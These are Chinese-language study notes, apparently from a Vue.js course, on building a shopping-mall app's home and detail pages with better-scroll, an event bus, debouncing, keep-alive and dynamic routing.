上面我们给``<scroll>``组件 添加了ref属性, 那么这里我们就可以拿到该组件对象  
通过 this.$refs.scroll 的方式 拿到了 Scroll.vue 组件  
Scroll.vue 中的 data 里面有 scroll属性, scroll属性绑定了 BScroll 对象 也就是说scroll是BScroll的实例对象  
那我们就可以调用scroll.scrollTo()方法

```js
this.$refs.scroll.scroll.scrollTo(0, 0, 500)
```

但是 this.$refs.scroll.scroll.scrollTo(0, 0, 500) 有点让人很不好理解 我们可以 在Scroll.vue中封装一个方法  
然后我们在home.vue组件中可以通过 this.$refs.scroll组件对象直接获取组件中的方法和属性 这就是封装的思想
```js
methods: {
  scrollTo(x, y, time=300) {
    this.scroll.scrollTo(x, y, time)
  }
}
```

```js
backClick() {
  this.$refs.scroll.scrollTo(0,0,500);
},
```

<br><br>

# 首页开发 - BackTop的显示和隐藏
我们观察做好的页面会发生, 当我们滚动屏幕的时候 这个组件会在某个临界值的时候显示 或者 隐藏

思路:
我们需要实时的监听滚动 比如滚动超过1000px的时候显示, 小于1000px的时候隐藏  
既然需要实时的监听滚动区域的滚动, 那么我们就要在 Scroll.vue 中开启监听滚动
```js 
this.scroll = new BScroll(this.$refs.wrapper, {
  probeType:3,        // 先定义监听滚动的属性
  click:true,
  mouseWheel:true,
  observeDOM: true,

}),

// 2 监听滚动的位置 绑定scroll事件
this.scroll.on('scroll', (position) => {

})
```

但是在Scroll.vue中这么设置并不是很好, 因为在本组件中设置的话 更改的是通用, 以后在别的地方调用该组件的时候 也是开启了监听实时滚动的效果, 但是并不是所有调用该组件的都希望有实时监听滚动的功能
```
      封装的 Scroll 组件
    ↙                   ↘
A组件                     B组件

需要实时监听              不需要实时监听
```

所以在 Scroll.vue 里面不适合开启实时监听页面滚动 probeType:3

<br>

我们可以这样, 让调用该组件的人决定 需要不需要开启实时监听 同时 我们通过this.$emit()需要将 position 传递出去, 谁想用谁用
```js 
// Scroll.vue 组件
props: {
  proType: {
    type: Number,
    default:0
  }
},

mounted() {
  this.scroll = new BScroll(this.$refs.wrapper, {

      // 这里我们设置的默认值是0, 具体的值让父组件传递过来
      probeType:this.proType,
      click:true,
      mouseWheel:true,
      observeDOM: true,

  }),

  // 2 监听滚动的位置
  this.scroll.on('scroll', (position) => {

    // 我们这个position并不是在Scroll.vue组件里面使用的, 我么需要将position传递出去
    console.log(position)

    // 这样我们就将position传递出去了, 之后谁想后这个东西, 谁就去接收
    this.$emit('scroll', postion)
  })
},


// 在父组件中
<scroll class='content' ref='scroll' :probe-type='3' @scroll='contentScroll'>
  :probe-type='3'
  在父组件中 使用v-bind传递过来 传递3相当于开启了实时监听滚动

  @scroll='contentScroll'
  用来接收子组件中传递过来的position

contentScroll(position) {
  console.log(position)

  // 这里面做显示隐藏的逻辑
  position.y > 1000 or < 1000
},
```

<br>

### **总结:**
只要是让父组件决定的属性 我们使用props定义个变量, 这个变量不仅仅在DOM模板中使用, 还能在实例中当做属性使用

<br>

BackTop.vue组件的显示和隐藏
```html
<back-top @click.native='backClick' v-show='isShowBackTop'></back-top>
```

我们可以给这个组件 使用v-show 绑定一个变量 根据变量决定这个组件的显示和隐藏
```js 
// 我们在data里面定义变量
data() {
  return {
    isShowBackTop:false
  }
}

v-show='isShowBackTop';

// 当滚动到某一个位置的时候 我们就改变 isShowBackTop 为 true


// home.vue 父组件中
// position.y 是负数 我们前面加个 - 
contentScroll(position) {
  this.isShowBackTop = (-position.y) > 1000
}
```

<br><br>

# 首页开发 - 完成上拉加载更多
这个模块我们完成以下 上拉加载 更多  
也是需要监听滚动事件吧, 在Scroll.vue里开启上拉加载更多的属性  
也是这个上拉加载更多的属性, 不一定是每一个组件里都需要使用 所以我们也不要直接定义 pullUpLoad:true, 最好也是 把它定义一个变量 谁调用的时候 谁再确定是否需要开启这个功能
```js 
// 子组件 Scroll.vue
pullUpLoad: {
  type: Boolean,
  default: false
}

this.scroll.on('pullingUp', () => {
  console.log('上拉加载更多');
  this.$emit('pullingUp')
    使用$emit将事件单独的发射出去
})




// 父组件 home.vue
<scroll class='content' 
  ref='scroll' 
  :probe-type='3' 

  // 注意 这里将驼峰改成 - -
  @scroll='contentScroll' :pull-up-load='true'    

  // 这里接收子组件中传递的事件
  @pullingUp='loadMore'
>

loadMore() {
  console.log('上拉加载更多');

  // 这里针对现在的类型加载更多的对应的数据 选中谁给对应的分类做上拉加载更多的逻辑
  // 加载谁 currentType就记录着谁 一旦调用了这个方法就会取出当前页面让页面+1 载完一次以后 必须调用scroll.finishPullUp()告诉better-scroll一次加载完成
  this.getHomeGoods(this.currentType);
  
},


// 因为 scroll.finishPullUp(); 方法是在数据加载完成后 写上, 所以在请求数据的函数里书写
getHomeGoods(type, page).then((res) => {

  this.goods[type].list.push(...res.data.list);
  this.goods[type].page += 1;

  // 加载数据完成后 需要调用scroll.finishPullUp()方法 告诉betterscroll一次加载完成
  this.$refs.scroll.scroll.finishPullUp();

  // 但是上面的可读性比较差, 我们对这个方法在scroll.vue中再做一层封装

});


// 子组件 Scroll.vue 里
methods: {
  scrollTo(x, y, time=300) {
    this.scroll.scrollTo(x, y, time)
  },
    
  // 我们对finishPullUp方法做一层封装
  finishPullUp() {
    this.scroll.finishPullUp()
  }
}
```

### **总结:**
this.$emit() 不仅仅是传递参数 还是可以单独的传递事件  
上面完成了子组件将上拉加载更多的事件发射到了父组件中处理(数据在父组件啊, Scroll.vue组件也是公共的不能处理只属于home的逻辑, 所以我们将事件发送出去)

上面的滚动还是有些问题, 因为有的时候页面突然不能滚动了 原因是因为scroll插件计算出来的 和我们用到的高度不一样

**原因:**  
当我们使用better-scroll创建简单的滚动的时候 不会产生bug

但是现在比较复杂 因为better-scoll要计算可滚动的高度(内容的高度 - wrapper的高度)

但是我们的情况又比较复杂, 因为我们的内容是一个个的小组件, 当我们最开始给better-scroll的时候图片还没有加载出来 因为图片是异步加载的 所以better-scroll在计算一个小的item组件的时候 是不包含图片的 所以better-scroll在计算整个内容区的高度的时候是不包含图片的
  
比如 它计算出来的是 height:2000  
但是后面我们的图片加载过来了 也就意味着每一个小的item被撑高了 最终整个的内容区域就会变的很多 但是better-scroll并不会重新计算的

所以我们应该先监听图片加载完 然后调用refresh()方法重新计算高度
    
<br><br>

# 首页开发 - 滚动区域的Bug分析和解决
我们这里要完成的逻辑是, 一旦图片加载完成, 我们调用 scroll.refresh()方法

**思路:**  
better-scroll在决定有多少区域可以滚动时, 是根据scrollHeight属性决定

- scrollerHeight属性是根据放在better-scroll的content中的子组件的高度决定的
- 但是我们的首页中, 刚开始在计算scrollerHeight属性时, 是没有将图片计算在内的, 所以计算出来的高度是错误的
- 后来图片加载进来之后有了新的高度, 但是scrollerHeight属性并没有进行更新所以滚动出现了问题

<br>

**解决方式:**
监听每一张图片是否加载完成, 只要有一张图片加载完成了, 就执行一次refresh()

<br>

**如何监听图片加载完成了?**
原生js中 img.onload = function() {  } 但是在vue中不用这样

<br>

我们需要监听图片加载完成了没 图片在哪里?
```
components -- content -- goods -- GoodsListItem.vue中
```

使用 @load 事件 就是 原生的img.onload事件

**<font color="#C2185B">@load</font>**  
图片每加载成功一次 就会调用这个方法一次

```html
<img :src="goodsItem.show.img" alt="" @load='imgLoad'>

<script>
methods: {
  // 一旦图片加载完成 就会执行这个函数 每加载一次就会调用这个函数一次
  imgLoad() {

    // 在这里调用scroll的refresh()方法 但是这个组件中没办法直接获取到scroll组件对象

  }
}
</script>
```

我们现在遇到的问题就是, 我们先看下组件的结构
```
| - home.vue
  | - Scroll.vue                2. 拿到这个组件对象
  | - GoodsList.vue             ↑
    | - GoodsListItem.vue       1. 我们需要在这里

1. 中拿不到 scroll组件对象, 但是home.vue里面可以拿到 所以
```
  
<br>
  
### **解决办法1: 组件之间的层层传递**
我们将事件从GoodsListItem传递到GoodsList再传递home里面
```
GoodsListItem.vue   -- >   GoodsList.vue   -- >   home.vue
```

上面的思路会有一些麻烦 因为组件之间的层层传递有点麻烦

<br>

### **解决办法2: VueX**
我们利用 vuex 来解决, vuex里面记录的是状态, 那么每当GoodsListItem中图片加载完成一次以后 我们就改变 vuex 中定义好的一个变量  
同时在home.vue中引用vuex中的这个变量, 在实时监听这个变量 一旦这个属性发生改变的时候, 我们就执行 scroll.refresh()

``` 
  home.vue        vuex            GoodsListItem.vue

  监听变量,       定义变量         每当加载成功图片一次 就修改vuex变量一次
  变量一旦改变
  执行 refresh
  一次 

  因为 每一个组件都能通过 this.$store 访问到vuex中的属性 和 方法  
```
  
<br>

### **解决方式3   事件总线  this.$bus.emit('事件名')**
有一个地方 是共用的 叫做 事件总线(我们用vue实例充当事件总线)

<br>

**事件总线的创建:**    
**<font color="#C2185B">Vue.prototype.$bus = new Vue()</font>**
main.js文件 --- 给vue原型添加$bus 并赋值vue实例

我们给vue的原型添加一个$bus, 添加的$bus是一个空的对象, 没办法发射事件对吧  
因为我们下面是用this.$bus.emit() 发射事件 但是$bus是刚创建的对象, 空的吧 哪来的emit()方法, 所以 我们可以这个$bus赋值为 Vue实例

Vue实例是可以做事件总线的
```js 
// main.js文件中
Vue.prototype.$bus = new Vue()
```

之后我们就可以使用vue发射事件和监听事件

<br>

组件1 通过 **this.$bus.$emit('事件名')** 发射事件到 事件总线  
组件2 通过 **this.$bus.$on('事件名', function() { })** 来监听 事件总线中的 事件, 回调中处理

跟vuex很像, 但是<font color="#C2185B">事件总线不是用来管理状态的 是用来管理事件的</font>

<br>

**事件总线的简单应用:**
```js 
// 组件1
this.$bus.emit('aaa')    // 将aaa事件发送的事件总线里面

// 组件2
this.$bus.on('aaa', function() {
  // 组件1中发射到 事件总线的事件, 会在这个回调中监听到
})
```


回过头来看看我们的项目
```js 
// GoodsListItem.vue中
<img :src="goodsItem.show.img" alt="" @load='imgLoad'>

methods: {
  imgLoad() {
    // 我们将 imgLoad 发射出去 发射到事件总线, 事件总线也是一个公共的区域这样别的组件就可以通过事件总线 获取我们发射到事件总线的事件
    this.$bus.$emit('imgLoad')
  }
}


// home.vue中
created() {
  // 我们在created中监听, 一旦组件创建完毕 我就等着监听imgLoad事件 监听GoodsListItem中的图片加载完成
  this.$bus.$on('imgLoad', () => {

    // 每加载完成一个图片后 重新计算一下滚动内容区的高度
    this.$refs.scroll.refresh();
  }),
}
```

<br>

### **总结:**
当事件的传递 组件之间隔着层级太远, 我们可以使用事件总线的方式

事件总线包含了3部分代码
1. Vue.prototype.$bus = new Vue()    // main.js 中
2. this.$bus.$emit('事件名称', 参数)
3. this.$bus.$on('事件名称', function(参数) { })

<br>

**注意:**  
这里只是说了怎么获取数据 也就是传递数据 比如A如何给B数据 但是假如B想修改A里面的数据那怎么办？

一样 B要往事件总线发送一个事件 同时将要修改的值带过去 A要监听事件总线里面对应的事件 拿到值来做修改  
也就是说我们要返过来使用一遍事件总线的逻辑

当组件太多的时候 再使用事件总线就太乱了 也太麻烦了 而且尤其是涉及到读写的时候

<br><br>

# refresh函数找不到的bug处理
我们通过上面的方法使用refresh()的时候 可能会报错

### **问题可能性1**
```
cannot read property refresh of undefined
```
原因可能是 GoodsListItem中的图片来的太快了 当我们使用scroll.refresh()的时候, Scroll.vue组件还没有挂载

```
home.vue    --   GoodsList   --   GoodsListItem
```

**GoodsListItem中:**  
我们对img @load 监听了图片的加载
然后通过 this.$bus.$emit() 发射事件

<br>

**home.vue中:**  
这里我们监听 GoodsListItem 发射出来的事件 在监听的回调中 每成功加载一张图片 我们就在回调用 调用 this.$refs.scroll.refresh()  
我们在调用refresh()的时候 内部是 拿到 Scroll.vue 组件对象, 调用了组件对象内部的方法 而refresh()这个方法是在Scroll组件里面的

<br>

**Scroll.vue:**  
我们初始化scroll对象的时候是在mounted里面

<br>
上面报错的原因是 GoodsListItem 的图片来的太快了  
在Scroll.vue还没有挂载之前就请求回来图片了 请求图片加载完成后就会马上去home.vue中的@load中的回调里执行scroll组件对象的方法,  
但是scroll组件这时候还没有初始化完成 没初始化完成就代表是从undefined 或者 null上读取了refresh()方法 所以会报错

<br>

### **当有上面的情况的时候 我们可以这么写**
你有你再滚
```js
this.scroll && this.scroll.scrollTo(x, y, time)
```

当有这个对象的时候 再调用它的方法
```js 
// Scroll.vue

methods: {
  scrollTo(x, y, time=300) {
    this.scroll && this.scroll.scrollTo(x, y, time)
  },

  finishPullUp() {
    this.scroll && this.scroll.finishPullUp()
  },

  refresh() {
    this.scroll && this.scroll.refresh()
  }
}
```

<br>

### **问题可能性2**
我们关于 图片监听的处理函数 是在home.vue的created中的书写的 在 created 中去拿dom结构中的对象 可能是拿不到的
this.$refs.scroll 下面我们就使用了 this.$refs 相当于 document.getElementById去拿是一样的 都是在created中去拿dom中的对象 有可能是拿不到的因为created是阶段是拿不到dom节点的
```js 
this.$bus.$on('imgLoad', () => {
  this.$refs.scroll.refresh();
}),
```

综上 监听图片的加载事件要在mounted中去做

<br><br>

# 刷新频繁的防抖函数处理
报错的问题解决了之后 我们再说说 home.vue组件中的 图片监听事件 里面存在的刷新太过频繁的问题  
我们希望1秒钟内如果有多次调用只调用一次 1秒钟内如果有下一次的调用就等一会
```js 
this.$bus.$on('imgLoad', () => {

  // 这里面的逻辑调用的太频繁了
  
}),
```

比如说我们现在要开发一个搜索的功能, 我们在输入框内输入一个字母, 它就会想服务端发送一次请求, 请求过来的结果在输入框的下面做展示  
但是有些时候 用户输入过快, yifu 这样会往服务器发送4次请求 其实没有必要, 所以一般这个时候 我们就会给它做一个防抖动操作

用户输入一个y 然后本来想准备向服务器发送请求, 但是先不发等待100ms 看看用户是不是继续输入, 如果继续输入那就把y的那次请求取消掉 yi  
到yi后看看用户有没有继续输入 知道用户过了100ms没有输入 我们再发送网络请求

这就是防抖函数 在设定的时间内只触发一次, 如果有多次就取消上一次的请求等到时间后重新发送

放到我们的项目里也是一样的, 一张图片加载完成后先等500ms如果500ms内没有新的图片加载完成就调用refresh()方法, 如果有图片加载完成就停止调用refresh()等500ms之后一起调用refresh()方法  
节流通常用在轮播图

我们看看代码上的体现 防抖函数起作用的过程  
如果我们直接执行refresh, 那么refresh函数会被执行30次  
我们可以将刷新操作的函数refresh()放入 debounce防抖函数中 生成给一个新的函数  
之后在调用非常频繁的时候, 就使用新生成的函数, 而新生成的函数, 并不会非常频繁的调用, 如果下一次执行来的非常快, 那么就将上一次取消掉
```js 
mounted() {
  // 下面的函数是监听GoodsListItem组件中图片加载的情况, 在没有防抖的操作之前 它的内部会调用30次的刷新操作
  this.$bus.$on('imgLoad', () => {

    // 我们将下面这个代码放入防抖函数中 并在这个位置执行防抖函数
    this.$refs.scroll && this.$refs.scroll.refresh();
  })
},


// 防抖函数
debounce(func, delay) {
  let timer = null;
  return function(...args) {
    // 判断上面的timer有没有值 如果有值的话就清除掉
    if(timer) {
      clearTimeout(timer)
      timer = setTimeout(() => {
        func.apply(this, args)
      }, delay)
    }
  }
},
```

<br>

### **完整的代码部分:**
```js 
// home.vue中
mounted() {
  // this.$refs.scroll.refresh是不加小括号的
  const refresh = this.debounce(this.$refs.scroll.refresh, 100)
  this.$bus.$on('imgLoad', () => {
    refresh()
  })
}

// home.vue methods中定义的防抖函数
debounce(func, delay) {
  let timer = null;

  return function(...args) {
    // 判断上面的timer有没有值 如果有值的话就清除掉
    if(timer) {
      clearTimeout(timer)
    }
    timer = setTimeout(() => {
      func.apply(this, args)
    }, delay)
  }
},
```

<br>

### **知识点**
1. setTimeout在下一次事件循环的时候执行 这个函数会被放到最后执行
2. 引入utils.js中的方法函数的时候, 再调用的时候不用加this, this指向组件内的实例, 如果不加this就去找公共的方法

<br><br>

# 首页开发 --- 上拉加载更多的完成
上面我们在home.vue组件中对, 对图片加载的函数做了性能上的优化, 我们做了防抖  
但是像防抖这种功能性的函数不在单独的放在一个组件里面  
我们在common -- utils 创建这个js文件  
```js 
// utils.js中
// 防抖函数
export function debounce(func, delay) {
  let timer = null;
  return function(...args) {
    if(timer) {
      clearTimeout(timer)
    }
    timer = setTimeout(() => {
      func.apply(this, args)
    }, delay)
  }
}
```

上拉加载更多的逻辑已经做完了 在上节的上节?

<br><br>

# tabControl的offsetTop获取分析
首页接下来只剩下一个 流行 新款 精选 按钮的吸顶效果 之前我们是使用 粘滞定位 但是现在已经不起效果了
```css
.tab-control {
  position: sticky;
  top: 44px;
  z-index: 10;
}
```

我们要判断 这个按钮栏整体的滚动位置 比如我们往上滚动了500px 我就判断滚动的距离是不是>500 如果大于500 这个时候要做吸顶, 那就改变为fixed

<br>

### **具体步骤:**
**要点:**
```js
this.$refs.组件对象.$el 拿到组件内的根元素(div)部分
```

<br>

**1. 必须知道滚动到多少时, 开始有吸顶效果**  
也就是说 我们滚动到目标对象的offsetTop值的时候开始有吸顶效果 这个时候就需要获取tabControl的offsetTop
但是 如果直接在mounted中获取tabControl的offsetTop 那么值是不正确的

如果获取正确的值呢?
- 监听HomeSwiper中的img的加载完成
- 加载完成后, 发出事件, 在home.vue中 获取正确的值  
补充 为了不让HomeSwiper多次发出事件可以使用isLoad的变量进行状态的记录

```js 
------ 顶部 ------
  ^
  ^   offsetTop   400px
  ^
  div
```
那就是说滚动过了400px的时候 要有吸顶的效果

**怎么才知道offsetTop值?**  
获取到tabControl的offsetTop

1. 我们在data中定义一个变量 用来保存offsetTop
```
tabOffsetTop: 0
```

2. 既然要获取offsetTop 那就要拿到这个组件对象 就像我们要获取div到顶部的距离也得拿到div对象 vue中我们通过ref来获取 
```
ref='tabControl'   this.$refs.tabControl
```

3. 在mounted中 我们拿到组件对象, 将offsetTop的值赋值给tabOffsetTop
```
this.tabOffsetTop = this.$refs.tabControl
```

this.$refs.tabControl 拿到的是组件对象 并不是dom对象, 比如div有offsetTop数据, 那么组件对象有offsetTop属性么? 没有  
那么我们只能拿到组件里面的对应元素就可以了

```html
<template>
  <div class='tab-control'>     我们拿到组件对象中的div就可以了吧 
  </div>
</template>
```

拿到里面div div才有offsetTop吧
```js 
// 在home.vue
mounted() {
  this.tabOffsetTop = this.$refs.tabControl.$el.offsetTop
  console.log(this.tabOffsetTop)    // 80
}
```
上面我们在mounted中获取的数据肯定不准 80px 太小了, 原因是因为 我们虽然在mounted中进行操作的 但是页面里面的图片还没有加载完毕, 所以这时候得到的位置是不准确的 值也就是不准确的  
所以我们要在图片加载完成后 再去获取这个值才是准确的

**上面在mounted中获取目标对象的offsetTop是不准确的 解决办法**  
1. 我们再次监听图片加载情况 加载完毕后再来获取offsetTop值

这个项目里面 tabControl组件上面 有3个部分有图片
```
轮播图

4个圆圈小图片

本周流行的大图
```
老师测试完毕 主要产生印象的还是轮播图的部分, 下面的两个部分并不会产生太大的影响

2. 这里我们主要监听一下轮播图的加载完成情况  
我们去轮播图的组件里面
```
home -- childComps -- HomeSwiper.vue中
```


```html
<a :href="item.link">
  <img :src="item.image" @load='imageLoad'/>     我们给它绑定@load事件
</a>

<script>
methods: {
  imageLoad() {
    // 在这里我们把这个事件发送出去 让home.vue去做处理
    this.$emit('swiperImageLoad')
  }
},
</script>
```

home.vue组件中
```html
<home-swiper :banners="banners" @swiperImageLoad='swiperImageLoad'></home-swiper>

<script>
methods: {
  // tabControl 监听轮播图的图片加载情况
  swiperImageLoad() {
    // 获取tabControl组件 然后将tabControl组件上面的偏移量给到tabOffsetTop保存起来
    this.tabOffsetTop = this.$refs.tabControl.$el.offsetTop
    console.log(this.tabOffsetTop)    // 这里面记住图片就打印几次

    // 在这里我们只需要获取一次正确的值就可以了
  },
}
</script>
```
  
因为每加载图片成功一次 HomeSwiper组件中就会发射事件一次, 一共4张图片就发射了4次事件  
但是对于高度来讲, 我们只需要知道一张图片的高度就可以了, 所以HomeSwiper组件里只需要发射一次事件就可以  
注意 在@load里面的就是图片加载后的状态


3. 让 HomeSwiper组件 只发射一次事件
```js 
data() {
  return {

    // 这里定义一个变量
    isLoad: false
  }
},

imageLoad() {
  // 这里只需要发射一次事件可以 先取反让它进入判断发射一次事情 然后修改变量让它进不来
  if(!this.isLoad) {    
    this.$emit('swiperImageLoad')
    this.isLoad = true
  }
}
```

弹幕说 获取正确的值的话 还可以在setTimeout里面做 这样是异步会等同步完成后再获取值? 好像也行啊

<br>

### **监听滚动 动态的改变tabControl的样式**
之前我们做backTop组件什么时候显示和隐藏 在methods中定义了一个函数 我们可以在这个函数中 继续完成tabControl是否吸顶的逻辑
```js 
// 关于backTop组件显示和隐藏的函数
contentScroll(position) {
  // 1. 判断backTop组件是否显示
  this.isShowBackTop = (-position.y) > 1000

  /*
    2. 决定tabControl是否吸顶(position:fixed)
    我们先在data中定义一个变量 isTabFixed: false 默认false
  */
  
  this.isTabFixed = (-position.y) > this.tabOffsetTop
  /*
    通过滚动 和 offsetTop 的值的比较决定 data中isTabFixed变量的值
    我们根据位置关系动态决定变量的值
    然后根据变量的值 动态决定css样式position: fixed 动态绑定calss
  */
},


<tab-control
  :titles="['流行', '新款', '精选']"
  class="tab-control"
  @tabClick="tabClick" 
  ref='tabControl' 
  :class='{fixed:isTabFixed}'       我们这里动态绑定class
></tab-control> 
```
当isTabFixed为true的时候绑定这个class 为false的时候不绑定

<br>

上面出现了两个问题:
1. Scoll组件里 关于监听滚动的部分 加上if判断后 home.vue组件中读不到position的值
2. 我们通过定义变量isTabFixed让它控制是否让tabControl组件fixed 但是因为fixed后脱离了文档流, 下面的结构会一下子上去
3. 因为better-scroll是理论是改变transform的translatey 虽然我们给组件fixed的 本应该定位在屏幕上的一个位置, 但是translatey还是可以改变fixed的位置的 fixed的状态 随着屏幕的滚动到滚动走了

上面的问因为better-scroll的原因 class的fixed的方式行不通 那我们就不能采用 class fixed的方法了

<br>

### **解决方式**
我们将 ``<tab-control>`` 组件复制一份到 ``<scroll>`` 组件的外面

界面上有两个 ``<tab-control>`` 组件 了
上面这个组件先隐藏 当滚动到一定位置后 显示, 其实下面的组件会随着better-scroll滚到上面去

也就是说在滚动区域的外面 然后对这个 ``<tab-control>`` 组件使用v-show  
也就是说 默认它是隐藏的 当滚动的距离大于下面的的offsetTop的时候 我们动态的修改了 isTabFixed 变量的值
```js 
<tab-control
  :titles="['流行', '新款', '精选']"
  class="tab-control"
  @tabClick="tabClick"
  ref="tabControl" 
  v-show='isTabFixed'     根据isTabFixed的值显示或者隐藏
></tab-control>
```

但是上面还有另一个问题 现在界面上有两个``<tab-control>``组件  
我们分别叫做 上组件 和 下组件 当我们点击下组件的新款按钮后 开始滚动 滚动到一定位置 上组件显示 但是上组件展示的 按钮内容 和下组件的不一致
```js 
上组件:   流行    新款    精选
        -----


下组件:   流行    新款    精选
                ----
```
也就是说下组件点击了什么 跟 上组件不能同步

那怎么让两个东西保持一致呢?  
只要我们能拿到``<tab-control>``组件 这个组件中有一个变量记录着谁被选中的
currentIndex

1. 我们给上组件 绑定 ref='tabControl1'    下组件的ref还是tabControl
2. 我们去methods中找到关于 点击组件的处理函数 tabClick
```js 
tabClick(index) {

switch (index) {
  case 0:
    this.currentType = "pop";
    break;
  case 1:
    this.currentType = "new";
    break;
  case 2:
    this.currentType = "sell";
    break;
}

// 这里处理逻辑
// 为了让上组件 和 下组件 的点击效果同步 我们将 index 传递给 上组件的currentIndex
// 两个组件都要设置 因为都要互相同步
this.$refs.tabControl1.currentIndex = index
this.$refs.tabControl.currentIndex = index
```

<br>

### **弹幕大神说**
```js 
this.$refs.tabControl.$el.style.transform = 'translateY((-value-this.tabOffsetTop) + px)'
```

<br><br>

# Home离开时记录状态和位置
我们首页滚动到一定的位置, 但我们点击分类页面之后, 再切换到首页 我们希望的停留在用户方才在首页滚动的位置上, 并不是去了其它页面后再回来我们还要从头开是滚动
现在我们的页面的跳转都是同过 router 来管理的, 当我们从首页 -- 关于 跳转到关于界面, 那么首页就会被销毁
```js 
// 我们在home.vue组件中的实例中
destroyed() {
  console.log('首页被销毁')
}
```
当离开home页面的到分类页面的时候确实会, 打印destroy中的代码 当我们再回到home页面的时候, home页面会被重新创建

那怎么才能不让页面被销毁呢?
使用 ``<keep-alive>``  

我们在App.vue中 将页面展示区域``<router-view>``使用``<keep-alive>``包裹起来
```html 
<!-- App.vue -->
<template>
  <div id="app">
    
    <!-- 不需要重新创建页面 保持状态 -->
    <keep-alive>
      <router-view></router-view>
    </keep-alive>

    <main-tab-bar></main-tab-bar>
  </div>
</template>


// 使用<keep-alive>后
destroyed() {
  console.log('首页被销毁')     // 并没有打印 因为首页没有被销毁
},
```

上面还是有些问题, 当我们多次往返之后 页面的位置会出现问题 并没有保持之前的状态, 那怎么才能让Home中的内容保持原来的位置

**解决方法:** 
1. 离开时, 保存一个位置信息
2. 进来时, 将位置设置为原来保存的位置信息

比如离开的时候 我们保存一个saveY, 回来的时候将Y值设置成saveY

想完成上面的逻辑 就要知道什么时候离开 什么时候进来的 之前我们学过两个函数

<br>

**<font color="#C2185B">activated() { ... }</font>**  
当页面处于活跃状态的时候, 执行该回调

<br>
  
**<font color="#C2185B">deactivated() { ... }</font>**  
当页面不处于活跃状态的时候, 执行该回调

<br>
  
我们定义一个变量 saveY 当离开页面的时候 将现在Y的值给变量saveY 当再进入这个页面的时候, 将Y值设置为saveY
```js 
deactivated() {
  // 那离开页面的位置 也就是当前页面的滚动的位置怎么获取?
  // scroll里面有一个属性y 记录着当前页面的当前的滚动位置
  this.saveY = this.$refs.scroll.scroll.y

  /*
    如果觉得上面的写法有点太长了 也可以对它进行下包装在Scroll.vue中 定义一个方法
  */
  
  getScrollY() {
    return this.scroll ? this.scroll.y : 0
  }
},
activated() {
  // 回到页面的时候 Y值应该是-的
  this.$refs.scroll.scrollTo(0, this.saveY, 0)
  // 回来的时候最好调用一下这个 不然后的时候会出现问题 刷新一下
  this.$refs.scroll.refresh();

  // 弹幕大佬说把refresh() 放在上面就好了
}
```


### **弹幕大佬说**
对于保持位置 可以在配置里面加上
```js 
keepAlive: true
```
activated必须要用keepAlive 别搞 什么意思?

<br><br>

# 跳转到详情页并且携带id
我们可以随意的点击一个商品 进入到商品的详情页面

**逻辑:**  
点击一个商品 根据点击的商品去服务器请求关于这个商品的所有信息 然后对这个商品的信息进行展示  
也就是获取这个商品的id 根据id去请求数据 然后做展示

点击一个商品就相当于 点击一个 GoodsListItem 那就监听它的点击
```html
<!-- GoodsListItem.vue中 -->
<template>
  <div class="goods-item" @click='itemClick'>    我们给这个div绑定事件


    <img :src="goodsItem.show.img" alt="" @load='imgLoad'>
    <div class="goods-info">
      <p>{{goodsItem.title}}</p>
      <span class="price">{{goodsItem.price}}</span>
      <span class="collect">{{goodsItem.cfav}}</span>


    </div>
  </div>
</template>

<script>
itemClick() {
  // 在这里处理跳转到详情页的逻辑
}
</script>
```

<br>

### **怎么跳转到详情页呢?**
我们可以给详情页配置一个路由, 这样就是路由之间的跳转了
详情页也是views文件里的一个大模块 我们在views里面再创建一个detail文件夹

```
| - views
  | - detail
    - Detail.vue
```

然后我们配置路由的映射关系
```
| - router
  - index 中
```

```js 
const Detail = () => import('views/detail/Detail')

{
  path: '/detail',
  component: Detail
}
```

然后我们通过点击 使用 this.$router.push() 来跳转页面 我们跳转到详情页还需要传递过去一些参数 最起码要把点击的商品的id传递过去
```js 
itemClick() {
  // 在这里处理跳转到详情页的逻辑
  this.$router.push('/detail')
}
```

<br>

### **跳转到详情页的时候 传递参数**
路由之间跳转传递参数有两种方式
1. 动态路由的方式
```js 
// 在router文件夹里面 index.js中配置动态路由
{
  path: '/detail/:id',
  component: Detail
}
```

2. 传递query的方式  
我们使用this.$router.push()方法的时候传递一个对象
```js 
itemClick() {

  this.$router.push({
    path: '/detail',
    query: {

    }
  })
}
```

这里我们使用动态路由的方法
```js 
itemClick() {
  // 在这里处理跳转到详情页的逻辑 我们在跳转到详情页的时候还要传递商品的id
  // 这里我们采用的是配置动态路由的方式, 那么我们使用push()方法传递数据的时候就要这样进行拼接

  this.$router.push('/detail/' + this.goodsItem.iid)
}
```

详情页接口:  
```
http://152.136.185.210:7878/api/m5/detail?iid=1lrzvr8
```

<br>

那我们通过在home.vue中点击商品 跳转到详情页的同时, 也传递了商品的id  

那么详情页中怎么接收传递过去的参数呢?
```
this.iid = this.$route.params.iid
```

我们通过$route对象的params来获取
```js 
// 组件一创建完毕 我们就获取商品的id 并且保存在data中
created() {
  this.iid = this.$route.params.iid
}
```

<br>

### **接下来我们开始写详情页的页面结构:**
1. 导航栏  
因为顶部的导航栏的逻辑还是比较多的 所以我们创建一个组件 然后引入到Detail.vue中
``` 
| - views
  | - detail
    | - childComps
      - DetailNavBar
  - Detail.vue
```

之前我们封装了一个NavBar 我们将它导入到 DetailNavBar.vue 中, 然后将 DetailNavBar.vue导入Detail.vue中
```js 
Detail.vue
    -- >    DetailNavBar.vue
                      -- >    NavBar.vue
```

接下来我们看看 导航栏都需要完成什么样的逻辑
1. 返回按钮的点击
2. 四个按钮的点击
3. 四个按钮的渲染

这个逻辑的代码比较简单就不在详细的写这个部分了
```html
<template>
  <div>
    <nav-bar>
      <template #left>
        <div class='back' @click='backClick'>
          <img src="~assets/img/common/back.svg" alt="">
        </div>
      </template>
      <template #center>
        <div class='title'>
          <div v-for='(item, index) of titles' class='title-item' @click=titleClick(index) :class='{active:index===currentIndex}'>{{item}}</div>
        </div>
        
      </template>
    </nav-bar>
  </div>
</template>

<script>
import NavBar from 'components/common/navbar/NavBar'

export default {
 name: 'DetailNavBar',
 components: {
   NavBar
 },
 data() {
   return {
     titles: ['商品', '参数', '评论', '推荐'],
     currentIndex: 0
   }
 },
 methods: {
   titleClick(index) {
     this.currentIndex = index
   },
   backClick() {
     // 这里返回的方法很多 this.$router.back() / go(-1)
     this.$router.back();
   }
 }
}
</script>
```

<br><br>

# $el 所有的组件对象可以通过$el才获取组建中的元素
```js 
<tab-control ref='tabControl'></tab-control>
// 我们通过设置ref this.$refs.name 的形式拿到组件对象

